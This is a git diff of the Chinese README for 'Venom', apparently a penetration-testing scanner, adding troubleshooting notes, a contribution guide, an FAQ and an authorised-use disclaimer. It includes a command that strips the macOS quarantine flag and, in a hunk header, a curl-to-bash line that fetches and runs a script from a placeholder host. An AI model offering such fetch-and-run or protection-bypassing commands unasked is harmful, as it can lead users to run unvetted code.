@@ -44,9 +44,17 @@
 
 https://github.com/Zcentury/Venom/releases/latest 点击进入下载
 
-问题：
-1.如果提示“Venom”已损坏，无法打开。你应该将它移到废纸篓。
-解决方法：`sudo xattr -dr com.apple.quarantine /Applications/Venom.app`
+**可能遇到的问题**
+
+1. 如果 **MacOS** 提示`"Venom"已损坏，无法打开。你应该将它移到废纸篓`。
+
+    ![image-20251203223002147](images/image-20251203223002147.png)
+
+    **解决方法**：
+
+    ```bash
+    sudo xattr -dr com.apple.quarantine /Applications/Venom.app
+    ```
 
 ---
 
@@ -135,14 +143,37 @@ curl -L http://xxxxxxx/file/2/file -o echo.sh && chmod +x echo.sh && bash echo.s
 
 ![image-20251203212945088](images/image-20251203212945088.png)
 
-
+---
 
 ## 🤝 贡献指南
 
-欢迎提交 Issue ！
+如果出现以下几种情况，请 **积极** 联系作者反馈，或提交 Issue
+
+1. 在使用过程中，存在看不懂的功能**（请务必告诉我，不要觉得是自己不会用）**
+2. 在使用过程中，发现用起来不方便的功能**（不舒服绝不能凑合，务必和我联系）**
+3. 某些功能想要进行联动
+4. 有自己想要的功能但目前还未开发
+5. 出现BUG
+6. 出现漏洞
+
+出现以上几种问题，请一定要及时和我反馈，这是对我的肯定，也是对我的认可，我将始终 **以用户体验** 为第一目标！
 
 ---
+## 💕 问题解答
 
+- **Q: 和 `Tscan` 什么关系？**
+
+​	**A:** 给了我灵感，让我产生了写这个工具的想法，不过我们架构不同，设计模式不同，只是界面像。不过在这里还是要感谢 `Tscan` 团队
+
+- **Q: 为什么程序这么大？**
+
+​	**A:** 因为架构采用了 `Electron` + `gRpc`，而electron会内置个浏览器进去，所以会很大
+
+- **Q: 为什么不用 `wails`？**
+
+​	**A:** 最开始设计时候，确实采用的是`wails`，但在开发过程中，每改动一个功能，都要重启10分钟左右，严重影响开发体验，所以就更换了
+
+---
 ## ⚠️ 免责声明
 
 **重要提示：本工具仅供安全研究和授权渗透测试使用！**
@@ -172,5 +203,4 @@ curl -L http://xxxxxxx/file/2/file -o echo.sh && chmod +x echo.sh && bash echo.s
    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=Zcentury/Venom&type=Date" />
  </picture>
 </a>
-
 
